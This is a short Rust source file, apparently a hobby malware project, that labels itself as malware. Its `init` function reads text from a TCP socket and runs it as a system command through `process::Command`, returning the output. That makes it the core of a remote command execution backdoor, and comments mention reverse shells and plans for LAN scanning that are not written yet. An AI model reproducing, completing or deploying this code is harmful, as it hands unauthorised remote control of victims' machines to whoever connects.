use std::{
    error::Error,
    process::{self, Stdio},
};

use tokio::net::TcpStream;

fn shell(command: &str) -> Result<Box<[u8]>, Box<dyn Error>> {
    let mut args: Vec<&str> = command.split(" ").collect();
    let main_arg = args[0];

    if args.len() > 1 {
        args = args.split_off(1)
    }
    dbg!(&args);
    let result = process::Command::new(main_arg)
        .args(args)
        .stdout(Stdio::piped())
        .output()?;
    let stdout = String::from_utf8(result.stdout.clone());
    let stderr = String::from_utf8(result.stderr.clone());
    println!("{:?}", stdout);
    println!("{:?}", stderr);
    Ok(result.stdout.into_boxed_slice())
}

pub async fn init(socket: TcpStream) -> Result<Box<[u8]>, Box<dyn Error>> {
    // on run... do this:
    /*
     * 1. Detect what shells are on the machine
     * 2. print a nice little hello message
     * 3. see what other computers are running on a lan.
     * 4. print a goodbye message.
     * */
    println!("Hello there, i am malware!");

    //tokio can be used to spawn a server to create a reverse shell.
    let mut buffer = vec![0; 1024];
    match socket.try_read(buffer.as_mut_slice()) {
        Ok(v) => buffer.truncate(v),
        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => (),
        Err(e) => eprintln!("{}", e),
    }
    let input = String::from_utf8(buffer)?;

    let response = shell(input.trim())?;
    Ok(response)
}
